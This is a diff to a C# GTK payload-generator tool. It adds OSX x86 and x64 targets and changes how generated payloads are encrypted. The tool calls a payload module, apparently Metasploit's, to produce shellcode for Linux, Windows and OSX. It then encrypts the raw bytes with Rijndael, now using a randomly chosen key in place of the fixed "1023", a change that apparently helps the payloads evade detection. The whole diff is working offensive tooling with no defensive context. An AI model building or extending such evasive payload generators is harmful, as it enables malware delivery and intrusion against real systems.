@@ -20,6 +20,7 @@ public partial class MainWindow: Gtk.Window
 	Notebook _parentNotebook = null;
 	Dictionary<string, Dictionary<string, object>> _newPayloads = new Dictionary<string, Dictionary<string, object>> ();
 	SymmetricAlgorithm _algorithm = new RijndaelManaged ();
+	Random _random = new Random();
 
 	public MainWindow () : base (Gtk.WindowType.Toplevel)
 	{
@@ -89,6 +90,8 @@ public partial class MainWindow: Gtk.Window
 		AddPlatformTab ("Linux x86-64", "linux/x64", _parentNotebook);
 		AddPlatformTab ("Windows x86", "windows", _parentNotebook, "x64");
 		AddPlatformTab ("Windows x86-64", "windows/x64", _parentNotebook);
+		AddPlatformTab ("OSX x86", "osx/x86", _parentNotebook);
+		AddPlatformTab ("OSX x86-64", "osx/x64", _parentNotebook);
 
 		_main.PackStart (_parentNotebook, false, false, 10);
 
@@ -130,9 +133,9 @@ public partial class MainWindow: Gtk.Window
 				pair.Value ["Format"] = "csharp";
 				var response = _manager.ExecuteModule ("payload", pair.Key, pair.Value);
 
-				if (pair.Key.StartsWith ("linux/x86")) {
+				if (pair.Key.StartsWith ("linux/x86") || pair.Key.StartsWith("osx/x86")) {
 					linx86Payload += (response ["payload"] as string).Split ('=') [1].Replace (";", ",");
-				} else if (pair.Key.StartsWith ("linux/x64")) {
+				} else if (pair.Key.StartsWith ("linux/x64") || pair.Key.StartsWith("osx/x64")) {
 					linx64Payload += (response ["payload"] as string).Split ('=') [1].Replace (";", ",");
 				} else if (pair.Key.StartsWith ("windows/x64")) {
 					winx64Payload += (response ["payload"] as string).Split ('=') [1].Replace (";", ",");
@@ -155,14 +158,14 @@ public partial class MainWindow: Gtk.Window
 				pair.Value ["Format"] = "raw";
 				var response = _manager.ExecuteModule ("payload", pair.Key, pair.Value);
 
-				if (pair.Key.StartsWith ("linux/x86")) {
-					linx86Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], "1023"));
-				} else if (pair.Key.StartsWith ("linux/x64")) {
-					linx64Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], "1023"));
+				if (pair.Key.StartsWith ("linux/x86") || pair.Key.StartsWith("osx/x86")) {
+					linx86Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
+				} else if (pair.Key.StartsWith ("linux/x64") || pair.Key.StartsWith("osx/x64")) {
+					linx64Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
 				} else if (pair.Key.StartsWith ("windows/x64")) {
-					winx64Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], "1023"));
+					winx64Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
 				} else { /*windows x86*/
-					winx86Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], "1023"));
+					winx86Payload += GetByteArrayString (EncryptData (response ["payload"] as byte[], _random.Next(1023).ToString()));
 				}
 			}
 
